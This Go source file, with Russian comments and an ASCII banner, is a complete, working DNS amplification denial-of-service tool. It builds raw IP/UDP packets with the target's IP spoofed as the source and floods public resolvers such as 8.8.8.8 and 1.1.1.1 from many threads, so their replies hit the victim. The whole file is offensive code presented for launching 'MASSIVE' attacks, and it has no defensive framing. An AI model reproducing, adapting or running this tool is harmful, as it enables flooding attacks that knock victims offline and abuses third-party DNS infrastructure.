package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

type Config struct {
	targetIP   string
	dnsServers []string // Множество DNS-серверов
	domains    []string // Множество доменов
	count      int
	threads    int // Количество потоков
	duration   int // Длительность в секундах
}

func main() {
	banner := `
    ╔═══════════════════════════╗
    ║   ┏━┓╻ ╻╺┓ ┏━┓┏━╸┏━┓╺┓ 	║
	║	┗━┓┃╻┃ ┃ ┏━┛┣╸ ┏━┛ ┃ 	║
	║	┗━┛┗┻┛╺┻╸┗━╸╹  ┗━╸╺┻╸   ║
    ║     DNS Amplification     ║
    ╚═══════════════════════════╝
    `
	fmt.Println(banner)

	cfg := parseFlags()

	fmt.Printf("Starting MASSIVE DNS amplification attack:\n")
	fmt.Printf("Target IP: %s\n", cfg.targetIP)
	fmt.Printf("DNS Servers: %d servers\n", len(cfg.dnsServers))
	fmt.Printf("Domains: %d domains\n", len(cfg.domains))
	fmt.Printf("Threads: %d\n", cfg.threads)
	fmt.Printf("Duration: %d seconds\n\n", cfg.duration)

	var wg sync.WaitGroup
	packetsPerThread := cfg.count / cfg.threads
	startTime := time.Now()
	endTime := startTime.Add(time.Duration(cfg.duration) * time.Second)

	stats := &Stats{
		mutex:  &sync.Mutex{},
		sent:   0,
		failed: 0,
		start:  startTime,
	}

	fmt.Printf("Launching %d attack threads...\n", cfg.threads)

	// Запускаем поток для вывода статистики
	go stats.printStats(endTime)

	// Запускаем атакующие потоки
	for i := 0; i < cfg.threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()
			cfg.attackThread(threadID, packetsPerThread, endTime, stats)
		}(i)
	}

	wg.Wait()

	fmt.Printf("\n" + strings.Repeat("=", 60) + "\n")
	fmt.Printf("ATTACK COMPLETED!\n")
	fmt.Printf("Total packets: %d\n", stats.sent)
	fmt.Printf("Failed packets: %d\n", stats.failed)
	fmt.Printf("Duration: %v\n", time.Since(startTime))
	fmt.Printf("Rate: %.2f packets/second\n", float64(stats.sent)/time.Since(startTime).Seconds())
}

type Stats struct {
	mutex  *sync.Mutex
	sent   int
	failed int
	start  time.Time
}

func (s *Stats) incrementSent() {
	s.mutex.Lock()
	s.sent++
	s.mutex.Unlock()
}

func (s *Stats) incrementFailed() {
	s.mutex.Lock()
	s.failed++
	s.mutex.Unlock()
}

func (s *Stats) printStats(endTime time.Time) {
	for {
		time.Sleep(2 * time.Second)
		s.mutex.Lock()
		sent := s.sent
		failed := s.failed
		duration := time.Since(s.start)
		rate := float64(sent) / duration.Seconds()
		s.mutex.Unlock()

		remaining := time.Until(endTime)
		if remaining < 0 {
			return
		}

		fmt.Printf("[STATS] Sent: %d, Failed: %d, Rate: %.1f pps, Time left: %v\r",
			sent, failed, rate, remaining.Round(time.Second))
	}
}

func (cfg *Config) attackThread(threadID, packets int, endTime time.Time, stats *Stats) {
	// Создаем RAW-сокет для этого потока
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		log.Printf("Thread %d: Failed to create socket: %v", threadID, err)
		return
	}
	defer syscall.Close(fd)

	serverIndex := 0
	domainIndex := 0

	for time.Now().Before(endTime) {
		// Выбираем DNS-сервер и домен по кругу
		dnsServer := cfg.dnsServers[serverIndex]
		domain := cfg.domains[domainIndex]

		dnsIP, dnsPort := parseDNSServer(dnsServer)

		addr := syscall.SockaddrInet4{
			Port: dnsPort,
			Addr: ipToArray(dnsIP),
		}

		// Создаем DNS-запрос
		dnsQuery := createDNSQuery(domain)
		udpHeader := createUDPHeader(10000+threadID, dnsPort, 8+len(dnsQuery))
		udpPacket := append(udpHeader, dnsQuery...)
		ipHeader := createIPHeader(cfg.targetIP, dnsIP.String(), len(udpPacket))
		fullPacket := append(ipHeader, udpPacket...)

		// Отправляем пакет
		err := syscall.Sendto(fd, fullPacket, 0, &addr)
		if err != nil {
			stats.incrementFailed()
		} else {
			stats.incrementSent()
		}

		// Переходим к следующему серверу и домену
		serverIndex = (serverIndex + 1) % len(cfg.dnsServers)
		domainIndex = (domainIndex + 1) % len(cfg.domains)

		// Минимальная задержка для максимальной скорости
		time.Sleep(10 * time.Microsecond)
	}
}

func parseFlags() *Config {
	cfg := &Config{}

	// Параметры по умолчанию для серьезной атаки
	dnsServers := flag.String("dns", "8.8.8.8:53,1.1.1.1:53,9.9.9.9:53,8.8.4.4:53", "DNS servers (comma separated)")
	domains := flag.String("domains", "google.com,youtube.com,facebook.com,amazon.com,microsoft.com", "Domains to query")
	flag.StringVar(&cfg.targetIP, "target", "192.168.1.100", "Target IP")
	flag.IntVar(&cfg.count, "count", 100000, "Total packets to send")
	flag.IntVar(&cfg.threads, "threads", 50, "Number of threads")
	flag.IntVar(&cfg.duration, "duration", 30, "Attack duration in seconds")

	flag.Parse()

	// Парсим списки DNS-серверов и доменов
	cfg.dnsServers = strings.Split(*dnsServers, ",")
	cfg.domains = strings.Split(*domains, ",")

	return cfg
}

// Остальные функции (parseDNSServer, ipToArray, createIPHeader, createUDPHeader, createDNSQuery, splitDomain, calculateChecksum)
// остаются без изменений из предыдущего кода

func parseDNSServer(server string) (net.IP, int) {
	parts := strings.Split(server, ":")
	ip := net.ParseIP(parts[0])
	if ip == nil {
		log.Fatalf("Invalid DNS server IP: %s", parts[0])
	}

	port := 53
	if len(parts) > 1 {
		p, err := strconv.Atoi(parts[1])
		if err != nil {
			log.Fatalf("Invalid DNS server port: %s", parts[1])
		}
		port = p
	}

	return ip.To4(), port
}

func ipToArray(ip net.IP) [4]byte {
	var ipArray [4]byte
	copy(ipArray[:], ip.To4())
	return ipArray
}

func createIPHeader(srcIP, dstIP string, dataLen int) []byte {
	header := make([]byte, 20)
	header[0] = 0x45
	header[1] = 0x00
	binary.BigEndian.PutUint16(header[2:4], uint16(20+dataLen))
	binary.BigEndian.PutUint16(header[4:6], uint16(0x1234))
	binary.BigEndian.PutUint16(header[6:8], 0x0000)
	header[8] = 64
	header[9] = 17
	binary.BigEndian.PutUint16(header[10:12], 0)
	copy(header[12:16], net.ParseIP(srcIP).To4())
	copy(header[16:20], net.ParseIP(dstIP).To4())
	checksum := calculateChecksum(header)
	binary.BigEndian.PutUint16(header[10:12], checksum)
	return header
}

func createUDPHeader(srcPort, dstPort, length int) []byte {
	header := make([]byte, 8)
	binary.BigEndian.PutUint16(header[0:2], uint16(srcPort))
	binary.BigEndian.PutUint16(header[2:4], uint16(dstPort))
	binary.BigEndian.PutUint16(header[4:6], uint16(length))
	binary.BigEndian.PutUint16(header[6:8], 0)
	return header
}

func createDNSQuery(domain string) []byte {
	query := make([]byte, 12+len(domain)+5)
	query[0] = 0xAA
	query[1] = 0xBB
	query[2] = 0x01
	query[3] = 0x00
	query[4] = 0x00
	query[5] = 0x01
	for i := 6; i < 12; i++ {
		query[i] = 0x00
	}
	offset := 12
	parts := splitDomain(domain)
	for _, part := range parts {
		query[offset] = byte(len(part))
		offset++
		copy(query[offset:], part)
		offset += len(part)
	}
	query[offset] = 0x00
	offset++
	query[offset] = 0x00
	query[offset+1] = 0x01
	query[offset+2] = 0x00
	query[offset+3] = 0x01
	return query
}

func splitDomain(domain string) [][]byte {
	var parts [][]byte
	start := 0
	for i, ch := range domain {
		if ch == '.' {
			parts = append(parts, []byte(domain[start:i]))
			start = i + 1
		}
	}
	parts = append(parts, []byte(domain[start:]))
	return parts
}

func calculateChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data); i += 2 {
		var word uint16
		if i+1 < len(data) {
			word = binary.BigEndian.Uint16(data[i : i+2])
		} else {
			word = uint16(data[i]) << 8
		}
		sum += uint32(word)
	}
	for sum>>16 > 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}
